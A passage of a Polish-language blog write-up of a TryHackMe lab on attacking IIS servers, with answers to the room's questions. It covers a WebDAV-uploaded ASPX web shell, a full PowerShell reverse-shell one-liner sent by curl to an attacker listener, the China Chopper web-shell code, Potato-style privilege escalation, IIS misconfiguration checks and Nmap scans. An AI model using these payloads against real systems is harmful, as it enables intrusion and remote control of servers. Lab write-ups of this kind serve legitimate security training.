Port 443 jest preferowany od portu 4444, ponieważ ruch wychodzący HTTPS prawie nigdy nie jest blokowany przez zapory korporacyjne, co zmniejsza prawdopodobieństwo zerwania połączenia zwrotnego.

Następnie skonstruuj polecenie powłoki odwrotnej programu PowerShell i przekaż je przez powłokę ASPX. Zastąp je `{CONNECTION_IP}`adresem IP AttackBox lub adresem  `tun0`IP interfejsu, jeśli korzystasz z sieci VPN TryHackMe:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c `
"$client = New-Object System.Net.Sockets.TCPClient('{CONNECTION_IP}',443);`
\(stream = \)client.GetStream();`
[byte[]]$bytes = 0..65535|%{0};`
while((\(i = \)stream.Read(\(bytes,0,\)bytes.Length)) -ne 0){`
\(data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\)bytes,0,$i);`
\(sendback = (iex \)data 2>&1 | Out-String );`
\(sendback2 = \)sendback + 'PS ' + (pwd).Path + '> ';`
\(sendbyte = ([text.encoding]::ASCII).GetBytes(\)sendback2);`
\(stream.Write(\)sendbyte,0,\(sendbyte.Length);\)stream.Flush()};`
$client.Close()""
```

Flagi te blokują interakcję użytkownika i omijają domyślną politykę wykonywania, która w przeciwnym razie blokowałaby niepodpisane skrypty: `-NoP`pomijają profil programu PowerShell, `-NonI`działają w trybie nieinteraktywnym, `-W Hidden`ukrywają okno i `-Exec Bypass`zastępują `Restricted`domyślną politykę wykonywania.

W AB wprowadź następujące polecenie:

Terminal

```shell-session
root@ip-10-82-82-195:~# curl -G "http://MACHINE_IP/webdav/cmd.aspx" \
>   --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "\(client = New-Object System.Net.Sockets.TCPClient('"'"'CONNECTION_IP'"'"',443);\)stream = \(client.GetStream();[byte[]]\)bytes = 0..65535|%{0};while((\(i = \)stream.Read(\(bytes,0,\)bytes.Length)) -ne 0){;\(data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\)bytes,0,\(i);\)sendback = (iex \(data 2>&1 | Out-String );\)sendback2 = \(sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';\)sendbyte = ([text.encoding]::ASCII).GetBytes(\(sendback2);\)stream.Write(\(sendbyte,0,\)sendbyte.Length);\(stream.Flush()};\)client.Close()"'
```

Zakoduj całe polecenie w formacie URL i przekaż je jako  `cmd`parametr do `cmd.aspx`. Po nawiązaniu połączenia przez odbiornik Netcat uruchomi się interaktywna sesja programu PowerShell.

## **Krok 3: Potwierdź uprawnienia w powłoce odwrotnej**

Po nawiązaniu połączenia z powłoką uruchom polecenie, `whoami /priv`aby wyświetlić listę uprawnień dostępnych dla tego konta:

Terminal AttackBox — nasłuchiwacz Netcat

```shell-session
root@ip-10-82-74-10:~# nc -lvnp 443
listening on [any] 443 ...
Listening on 0.0.0.0 443
Connection received on 10.81.159.226 51067
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Wpis `SeImpersonatePrivilege`jest najważniejszy w przypadku późniejszej eksploatacji. To uprawnienie pozwala procesowi podszywać się pod dowolnego użytkownika, który łączy się z nim na poziomie tokenu Windows. To właśnie dzięki niemu PrintSpoofer, JuicyPotato i GodPotato działają. Narzędzia w stylu Potato wymuszają na procesie na poziomie SYSTEM uwierzytelnienie się w kontrolowanym przez atakującego nazwanym potoku, a następnie wykorzystują go `SeImpersonatePrivilege`do kradzieży tokenu SYSTEM z tego uwierzytelnienia. Dlatego to uprawnienie jest standardową ścieżką eskalacji z dowolnej tożsamości usługi sieciowej. Te narzędzia nadużywają podszywania się, aby przejść z poziomu `iis apppool\defaultapppool`do poziomu `SYSTEM`.

Eskalacja uprawnień z tego punktu wykracza poza zakres tego pomieszczenia. Warto zrozumieć, że uruchomienie powłoki ASPX na domyślnej instalacji IIS daje przewidywalne uprawnienia początkowe, a ścieżka eskalacji tych uprawnień jest dobrze udokumentowana.

## **China Chopper: Jak wyglądają prawdziwe pociski ASPX**

Chociaż powłoka, którą zbudowałeś do tego zadania, jest funkcjonalna, prawdziwi cyberprzestępcy często używają znacznie mniejszych i trudniejszych do wykrycia powłok. Najbardziej znaczącym przykładem z historycznego punktu widzenia jest China Chopper.

China Chopper został po raz pierwszy udokumentowany w 2012 roku i od tego czasu pojawia się w raportach o poważnych incydentach. HAFNIUM intensywnie używał wariantów China Chopper podczas kampanii Exchange ProxyLogon w 2021 roku ( [MITER ATT&CK T1505.003 (otwiera się w nowej karcie)](https://attack.mitre.org/techniques/T1505/003/) ). Powodem jego ciągłego występowania jest rozmiar: komponent po stronie serwera ma 73 bajty.

Cały komponent po stronie serwera to pojedyncza linia:

```csharp
<​%@ Page Language="Jscript"%​><​%eval(Request.Item["chopper"],"unsafe");%​>
```

Liczba ta obejmuje końcowy znak nowej linii. Plik zapisany na dysku ma łącznie 73 bajty. Atakujący komunikuje się za pośrednictwem oddzielnego narzędzia po stronie klienta, które wysyła zakodowane polecenia za pomocą żądania HTTP POST do `chopper`parametru. Powłoka akceptuje zakodowane dane, co utrudnia ich wykrycie za pomocą prostej inspekcji treści żądania. Obrońcy polują na China Chopper, szukając plików ASPX zawierających wzorce `eval(`lub `execute(`, szczególnie w katalogach, które nie powinny zawierać plików utworzonych przez użytkownika.

Z punktu widzenia osoby broniącej się, należy pamiętać o dwóch kwestiach dotyczących China Choppera: jego 73-bajtowym komponencie po stronie serwera oraz `eval(`wzorcu w zawartości pliku. Sygnatury antywirusowe i EDR często opierają się na tym ciągu znaków.

### Odpowiedz na poniższe pytania

Jakie konto użytkownika jest zwracane przez polecenie po uruchomieniu powłoki ASPX `whoami`? (Format odpowiedzi: małe litery, np. nt authority\system)`iis apppool\defaultapppool`

```shell
nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.113.190.54 50020
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```

Jakie uprawnienie systemu Windows, widoczne w `whoami /priv`wynikach powłoki odwrotnej, umożliwia eskalację uprawnień w stylu Potato z poziomu powłoki IIS?`SeImpersonatePrivilege`

## Błędne konfiguracje IIS

Do tej pory wykorzystaliśmy konkretną funkcję, WebDAV, która została celowo skonfigurowana na serwerze. Łańcuch ataku w zadaniach 4 i 5 wymagał jednoczesnego włączenia uprawnień zapisu, wykonywania skryptów i WebDAV. To jeden z typów powierzchni ataku IIS. To zadanie obejmuje inną kategorię: konfiguracje, które są domyślnie błędne lub łatwe do przypadkowego włączenia, a każda z nich generuje błąd samodzielnie, bez konieczności użycia luki w zabezpieczeniach (CVE) lub łańcucha exploitów.

Błędy w konfiguracji to najczęstsza powierzchnia ataku na IIS w rzeczywistych zastosowaniach. Tester penetracyjny, który pominie to sprawdzenie przed sięgnięciem po narzędzia do eksploitów, często przeoczy najłatwiejsze do wykrycia błędy.

## **Błędna konfiguracja 1: Włączono listę katalogów**

**Na czym polega:** Gdy w IIS nie ma skonfigurowanego domyślnego dokumentu dla katalogu (no `index.html`, no `default.aspx`), a `Directory Browsing`funkcja jest włączona w Menedżerze IIS, IIS renderuje listę plików zamiast zwracać `403`błąd Forbidden. Jest to powszechnie nazywane listą katalogów.

**Dlaczego to ważne:** Listing katalogów bezpośrednio ujawnia zawartość katalogów internetowych. Pliki kopii zapasowych, eksporty konfiguracji, przesłane treści użytkowników i kopie zapasowe kodu źródłowego stają się widoczne i możliwe do pobrania bez uwierzytelniania.

Aby to sprawdzić, przejdź do dowolnego katalogu na komputerze docelowym:

Terminal AttackBox

```shell-session
root@ip-10-82-74-10:~# curl http://MACHINE_IP/uploads/
<html><head><title>MACHINE_IP - /uploads/</title></head><body><H1>MACHINE_IP - /uploads/</H1><hr>

<pre><A HREF="/">[To Parent Directory]</A><br><br>
 4/13/2026  2:25 PM           31 <A HREF="/uploads/config.bak">config.bak</A><br>
 4/13/2026  2:25 PM          168 <A HREF="/uploads/web.config">web.config</A><br></pre><hr></body></html>
```

Włączono listę katalogów. Szukaj konkretnie rozszerzeń, które nie powinny być publicznie dostępne: `.bak`, `.config`, `.log`, `.zip`, `.sql`.

## **Błędna konfiguracja 2: HTTP PUT i DELETE bez uwierzytelniania**

Ćwiczyłeś to już w zadaniach 4 i 5. `OPTIONS`Sprawdzenie z zadania 2 ujawniło to:

```bash
curl -X OPTIONS http://MACHINE_IP/ -sv 2>&1 | grep "Allow:"
```

Jeśli `Allow:`nagłówek zawiera `PUT`lub `DELETE`nie zawiera wymogu uwierzytelnienia, możliwe jest nieuwierzytelnione przesyłanie plików. WebDAV nie musi być ograniczony do domeny `/webdav/`. Niektórzy administratorzy włączają go globalnie, co oznacza, że ​​każdy katalog w witrynie jest potencjalnie zapisywalny.

## **Błędna konfiguracja 3: narażenie na błąd web.config**

`web.config`to plik konfiguracyjny aplikacji [ASP.NET](http://asp.net/) . Zawiera ciągi połączenia z bazą danych, klucze API, dane uwierzytelniające SMTP, klucze szyfrowania i ustawienia aplikacji. IIS zazwyczaj blokuje `.config`pliki za pomocą reguły filtrowania żądań lub mapowania obsługi, które zwraca `404`. Jeśli ta reguła zostanie usunięta lub mapowanie MIME zostanie dodane nieprawidłowo,  `web.config`plik staje się możliwy do pobrania:

```bash
curl http://MACHINE_IP/web.config
```

Odpowiedź `200`z zawartością XML zaczynającą się od to `<configuration>`ustalenie o wysokim stopniu ważności. Sama sekcja ciągów połączeń często zawiera dane uwierzytelniające bazy danych.

## **Błędna konfiguracja 4: Wieloznaczne komunikaty o błędach**

IIS w trybie programistycznym zwraca pełne ślady stosu .NET w przypadku wystąpienia błędu aplikacji. Ślady te ujawniają wewnętrzne ścieżki do plików, takie jak `C:\inetpub\wwwroot\App\Controllers\AccountController.cs`wersja platformy .NET, nieudane zapytanie do bazy danych, a czasami wewnętrzny adres IP serwera.

W środowisku produkcyjnym ustawienie `customErrors`powinno `web.config`zostać zmienione na , `On`aby zastąpić ślady stosu ogólną stroną błędu:

```xml
<system.web>
  <customErrors mode="On" />
</system.web>
```

W przypadku `customErrors`wystąpienia błędu `Off`, wywołanie dowolnego błędu aplikacji zwraca pełny ślad stosu do wszystkich wywołujących, lokalnych i zdalnych. Domyślna wartość [w ASP.NET](http://asp.net/)`RemoteOnly` to , która chroni wywołujące programy zdalne, ale nadal udostępnia ślady na komputerze lokalnym. Serwer skonfigurowany z opcją `customErrors`absent-from `web.config`może nie być tak widoczny, jak się wydaje w zdalnym teście penetracyjnym. Tylko serwer where `customErrors`został jawnie ustawiony na `Off`wysyłanie śladów stosu do klientów zewnętrznych.

## **Błędna konfiguracja 5: trace.axd pozostawiony włączony**

[ASP.NET](http://asp.net/) zawiera wbudowany moduł obsługi diagnostyki `trace.axd`. Po włączeniu, odwiedzający [`http://target/trace.axd`](http://target/trace.axd)zwraca dziennik śledzenia aplikacji dla ostatnich żądań. Dziennik ten może zawierać nagłówki HTTP, wartości formularzy, stan sesji, pliki cookie i wewnętrzne dane czasowe dla każdego ostatniego żądania do aplikacji. Domyślnie dziennik śledzenia przechowuje 50 ostatnich żądań ( `requestLimit="50"`w `<trace>`elemencie). Na aktywnych serwerach to okno zamyka się szybko.

Aby sprawdzić, czy jest dostępny:

```bash
curl http://MACHINE_IP/trace.axd
```

Odpowiedź `200`potwierdzająca dostępność przeglądarki śledzenia to wynik. W środowisku produkcyjnym `trace.axd`należy ją wyłączyć, ustawiając `<trace enabled="false"/>`ją w `web.config`. Niektóre starsze wdrożenia IIS pozostawiają tę opcję włączoną, ponieważ została włączona podczas fazy rozwoju i nigdy nie została wyłączona przed uruchomieniem.

Powód, dla którego jest to istotne, wykracza poza samo ujawnianie informacji: pliki cookie sesji i tokeny uwierzytelniające widoczne w dzienniku śledzenia można odtworzyć bezpośrednio.

## **Błędna konfiguracja 6: Metoda TRACE włączona**

Metoda HTTP `TRACE`różni się od procedury obsługi [ASP.NET](http://asp.net/) `trace.axd` . HTTP `TRACE`odsyła przychodzące żądanie z powrotem do wywołującego i została zaprojektowana do testowania pętli diagnostycznej. W środowisku produkcyjnym nie służy ona żadnemu uzasadnionemu celowi i może umożliwiać ataki typu Cross-Site Tracing (XST).

Aby sprawdzić, czy `TRACE`jest włączone:

```bash
curl -X TRACE http://MACHINE_IP -sv
```

Odpowiedź `200`z żądaniem odzwierciedlonym w treści potwierdza, `TRACE`że ​​jest aktywna. Prawidłowy stan to `405 Method Not Allowed`.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Nowoczesne przeglądarki blokują `TRACE`XMLHttpRequest, co w praktyce eliminuje wektor ataku XST w scenariuszach opartych na przeglądarce. `TRACE`Wartość enabled nadal warto zgłosić jako ustalenie higieny konfiguracji, ale stopień jej ważności powinien odzwierciedlać fakt, że główna ścieżka ataku wymaga przestarzałej przeglądarki lub klienta HTTP innego niż przeglądarka.

## **Błędna konfiguracja 7: Pula aplikacji działająca jako konto uprzywilejowane**

Domyślna tożsamość AppPool ( `ApplicationPoolIdentity`) ma niskie uprawnienia. Administratorzy czasami konfigurują jednak AppPool do działania jako `SYSTEM`, `Administrator`lub konto administratora domeny, często w celu uniknięcia błędów uprawnień w udziałach plików lub bazach danych. Jeśli powłoka ASPX z zadania 5 jest nadal aktywna, sprawdź tożsamość AppPool, uruchamiając:

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```

Jeżeli wynikiem jest `nt authority\system`lub nazwa użytkownika administratora domeny zamiast `iis apppool\defaultapppool`, błędna konfiguracja zapewnia natychmiastowy wyższy poziom dostępu bez konieczności dodatkowego podnoszenia uprawnień.

### Odpowiedz na poniższe pytania

Przejdź do `/uploads/`katalogu w systemie docelowym. Jakie rozszerzenie pliku jest widoczne na liście katalogów? (Format odpowiedzi: uwzględnij kropkę, np. .bak)`.bak`

```shell
curl http://10.113.190.54/uploads/
<html><head><title>10.113.190.54 - /uploads/</title></head><body><H1>10.113.190.54 - /uploads/</H1><hr>

<pre><A HREF="/">[To Parent Directory]</A><br><br> 4/13/2026  2:25 PM           31 <A HREF="/uploads/config.bak">config.bak</A><br> 4/13/2026  2:25 PM          168 <A HREF="/uploads/web.config">web.config</A><br></pre><hr></body></html>
```

Która ścieżka URL procedury diagnostycznej [ASP.NET](http://asp.net/) powinna zostać wyłączona w środowisku produkcyjnym, ponieważ może ujawnić dane sesji, pliki cookie i historię żądań?`trace.axd`

## Automatyzacja

Poprzednie zadania polegały na ręcznym budowaniu powierzchni ataku IIS, po jednym poleceniu curl na raz. Identyfikacja dozwolonych metod HTTP, potwierdzenie WebDAV i znalezienie wymagań uwierzytelniania: każde z tych sprawdzeń zajmowało osobny krok.  **Silnik skryptów Nmap (NSE)** pozwala uruchomić je wszystkie w jednym przebiegu skanowania. Zrozumienie, po które skrypty sięgnąć i co oznaczają ich wyniki, jest kluczową umiejętnością w ocenie IIS.

## **Skrypty NSE dla IIS**

Nmap zawiera zestaw skryptów HTTP, które bezpośrednio odwołują się do sprawdzeń, które już wykonałeś ręcznie:

|**Scenariusz**|**Co to robi**|
|---|---|
|`http-methods`|Wysyła żądanie OPTIONS i analizuje `Allow:`nagłówek, aby wyświetlić listę dozwolonych metod|
|`http-webdav-scan`|Sprawdza obsługę WebDAV i pobiera nagłówki DAV serwera|
|`http-iis-webdav-vuln`|Testy omijania uwierzytelniania WebDAV w usługach IIS (CVE-2009-1535, dotyczy usług IIS 5 i 6)|
|`http-ntlm-info`|Wysyła `NTLM`żądanie uwierzytelnienia do określonej ścieżki i wyodrębnia informacje docelowe z odpowiedzi na wyzwanie NTLM.|

Wszystkie te elementy są zawarte w standardowej instalacji Nmap, nie są wymagane żadne dodatkowe wtyczki.

## **Wykrywanie wersji usługi**

Przed uruchomieniem skryptów należy rozpocząć skanowanie wersji:

Terminal

```shell-session
user@tryhackme$ nmap -sV -p 80 MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-06 19:32 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for MACHINE_IP (10.82.179.57)
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

Potwierdza to `Server:`nagłówek w Zadaniu 2. Mając dostępną wersję, wiesz, jaki zakres CVE jest odpowiedni i które skrypty należy uruchomić w następnej kolejności.

## **Wyliczanie metod HTTP**

Skrypt `http-methods`automatyzuje `OPTIONS`żądanie, które uruchomiłeś ręcznie w Zadaniu 2. Najpierw uruchom go na rootze:

Terminal

```shell-session
root@tryhackme:~# nmap --script http-methods -p 80 MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-06 19:33 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for MACHINE_IP (10.82.179.57)
Host is up (0.00037s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Zwróć uwagę, że ścieżka główna już udostępnia `WebDAV`metody, co oznacza, że `WebDAV`​​jest włączona globalnie na serwerze, a nie tylko na serwerze `/webdav/`. To samo w sobie jest błędną konfiguracją.

## **Wykrywanie WebDAV**

Skrypt `http-webdav-scan`bada protokół WebDAV, wysyłając `PROPFIND`żądanie i odczytując nagłówki odpowiedzi DAV:

Terminal

```shell-session
root@tryhackme:~# nmap --script http-webdav-scan -p 80 MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-06 19:40 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for MACHINE_IP (10.82.179.57)
Host is up (0.00037s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Wed, 06 May 2026 18:40:54 GMT
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/10.0

Nmap done: 1 IP address (1 host up) scanned in 0.53 second
```

Chociaż skanowanie zwraca  `WebDAV type: Unknown`, obecność WebDAV jest wyraźnie potwierdzona obecnością specyficznych dla WebDAV czasowników w wierszu `Public Options`, `PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY`, `MOVE`, `LOCK`i `UNLOCK`nie są częścią standardowego protokołu HTTP i pojawiają się tylko po włączeniu WebDAV. Wiersz `Allowed Methods`dodatkowo potwierdza, że ​​te czasowniki są akceptowane przez serwer. Rezultatem `WebDAV type: Unknown`jest różnica w wersji Nmap; Nmap 7.80 nie mógł zidentyfikować konkretnej implementacji WebDAV, ale lista czasowników nie pozostawia wątpliwości. W połączeniu z tym  `Server Type: Microsoft-IIS/10.0`polem mamy pełny obraz: jest to serwer IIS 10.0 z włączonym WebDAV i akceptującym operacje zapisu.

### Identyfikacja wymagań uwierzytelniania

Skrypt `http-ntlm-info`wysyła żądanie do ścieżki WebDAV i wyodrębnia szczegółowe informacje z odpowiedzi na wyzwanie NTLM, potwierdzając zarówno typ uwierzytelniania, jak i szczegóły dotyczące maszyny docelowej:

```shell
root@tryhackme:~# nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-06 19:54 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for MACHINE_IP (10.82.179.57)
Host is up (0.00036s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-ntlm-info: 
|   Target_Name: CHANGE-MY-HOSTN
|   NetBIOS_Domain_Name: CHANGE-MY-HOSTN
|   NetBIOS_Computer_Name: CHANGE-MY-HOSTN
|   DNS_Domain_Name: CHANGE-MY-HOSTNAME
|   DNS_Computer_Name: CHANGE-MY-HOSTNAME
|_  Product_Version: 10.0.17763

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Potwierdza to `Product_Version: 10.0.17763`system Windows Server 2019, a nazwa hosta komputera jest widoczna w `NetBIOS_Computer_Name`terenie — wszystko to za pomocą jednego, nieuwierzytelnionego sondowania.

Automatyzacja kondensuje wszystkie czynności wykonywane ręcznie w poprzednich zadaniach w jednym przebiegu skanowania Nmap. Zamiast uruchamiać osobne polecenia curl w celu sprawdzenia nagłówków, sondowania WebDAV i identyfikacji uwierzytelniania, skrypty NSE wyświetlają te same wyniki w ciągu kilku sekund.

### Odpowiedz na poniższe pytania

Który skrypt nmap NSE wylicza dozwolone metody HTTP na serwerze WWW?`http-methods`

## Wniosek

Przeanalizowałeś łańcuch ataku na IIS, od wstępnego rozpoznania po interaktywny dostęp do powłoki, i przeanalizowałeś błędy konfiguracji występujące w rzeczywistych sytuacjach. Techniki te pojawiają się w publicznych raportach o incydentach od głównych grup atakujących oraz w wynikach testów penetracyjnych w środowiskach korporacyjnych.

## **Najważniejsze wnioski**

- Odcisk palca IIS ustala wersję i powierzchnię funkcji przed jakimkolwiek aktywnym wykorzystaniem, ponieważ wersja określa, które luki CVE mają zastosowanie, a włączone funkcje, takie jak WebDAV, ujawniają bezpośrednie ścieżki ataku.
    
- Technika wyliczania tyldy w wersji 8.3 pozwala na ujawnienie ukrytych plików i katalogów, których nie da się przeszukać metodą siłową listy słów, ponieważ format krótkiej nazwy jest przewidywalny, nawet jeśli pełna nazwa pliku nie jest przewidywalna.
    
- Przesyłanie przez powłokę WebDAV wymaga jednoczesnego spełnienia trzech warunków: włączenia WebDAV, uprawnień do zapisu i uprawnień do wykonywania skryptów w tym samym katalogu. To `PUT-MOVE`obejście działa, ponieważ mapowania obsługi są stosowane w momencie żądania, a nie w momencie przesyłania.
    
- Powłoki internetowe ASPX działają w ramach tożsamości puli aplikacji, która domyślnie zawiera `SeImpersonatePrivilege`, co sprawia, że ​​eskalacja uprawnień w stylu Potato jest naturalnym kolejnym krokiem po przejęciu powłoki.
    
- Błędy w konfiguracji serwera IIS, takie jak lista katalogów, nieuwierzytelniony WebDAV, `web.config`ujawnienie informacji i `trace.axd`dostępność, stwarzają niezależnie od siebie sytuacje podatne na wykorzystanie luk, bez konieczności stosowania CVE.

Bądźcie na bieżąco, bo wkrótce pojawią się kolejne ekscytujące sesje poświęcone doskonaleniu umiejętności pentestingu.

[#spróbujhackme](https://www.sharonjebitok.com/tag/tryhackme)[#ataki na serwery WWW](https://www.sharonjebitok.com/tag/web-server-attacks)[#curl](https://www.sharonjebitok.com/tag/curl)[#bezpieczeństwo sieci](https://www.sharonjebitok.com/tag/web-security)
